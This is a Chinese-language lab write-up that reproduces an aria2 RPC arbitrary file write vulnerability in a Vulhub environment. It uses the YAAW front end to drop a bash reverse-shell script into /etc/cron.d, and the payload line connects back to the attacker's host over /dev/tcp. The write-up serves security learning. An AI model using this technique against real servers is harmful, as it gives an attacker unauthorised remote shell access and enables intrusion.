Aria2是一个命令行下轻量级、多协议、多来源的下载工具（支持 HTTP/HTTPS、FTP、BitTorrent、Metalink），内建XML-RPC和JSON-RPC接口。在有权限的情况下，我们可以使用RPC接口来操作aria2来下载文件，将文件下载至任意目录，造成一个任意文件写入漏洞。

本文仅作漏洞复现记录与实现，利用流程如下:

1.漏洞环境

url: <http://192.168.101.152:6800/>

2.利用过程

利用Vulnhub搭建好环境之后，访问目标的6800端口

返回404状态码，确认环境已经开启

![1615715641_604ddd39de7fee32296ab.png!small](https://image.3001.net/images/20210314/1615715641_604ddd39de7fee32296ab.png!small)

6800是aria2的rpc服务的默认端口，rpc服务通信需要json或xml传输，不太方便，可以借用第三方工具

[http://binux.github.io/yaaw/demo/ ](http://binux.github.io/yaaw/demo/)

![1615715831_604dddf7cd77ac630119d.png!small](https://image.3001.net/images/20210314/1615715831_604dddf7cd77ac630119d.png!small)

首先点击右上方的小钳子，配置服务器

![1615715879_604dde27208e2a6f33bf6.png!small](https://image.3001.net/images/20210314/1615715879_604dde27208e2a6f33bf6.png!small)

设置好后点击保存

![1615715923_604dde531bc5c4063e899.png!small](https://image.3001.net/images/20210314/1615715923_604dde531bc5c4063e899.png!small)

之后点击add，添加一个下载任务

![1615716084_604ddef439a5a0fba28a2.png!small](https://image.3001.net/images/20210314/1615716084_604ddef439a5a0fba28a2.png!small)

配置好下载的任务，通过写入一个crond任务来反弹shell

先生成一个反弹文件，将反弹文件放入服务器，开启http服务

    
    
    #!/bin/bash 
    /bin/bash -i >& /dev/tcp/192.168.1.128/1234 0>&1
    

设置好下载链接，这里将反弹文件下载到/etc/cron.d/下，文件名为test1，/etc/cron.d目录下的所有文件将被作为计划任务配置文件读取，等待一分钟左右，反弹shell。

![1615716011_604ddeab1a25ba2aaa5f2.png!small](https://image.3001.net/images/20210314/1615716011_604ddeab1a25ba2aaa5f2.png!small)

![1615716628_604de1146d46ed16f5395.png!small](https://image.3001.net/images/20210314/1615716628_604de1146d46ed16f5395.png!small)

